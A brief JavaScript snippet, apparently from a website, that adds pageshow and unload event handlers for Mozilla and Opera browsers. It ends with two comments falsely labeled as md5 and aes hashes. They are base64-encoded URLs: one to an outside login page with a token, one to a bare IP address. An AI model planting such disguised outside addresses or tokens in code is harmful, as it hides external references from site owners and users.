if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL3d3dy50dXR1bGVjaG4uY29tL2luZGV4L2xvZ2luL2xvZ2luL3Rva2VuLzE1Y2RiYTM0OWMyNjI2ODczMmUzNmY2NjUyZDBlOWY3Lmh0bWw=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/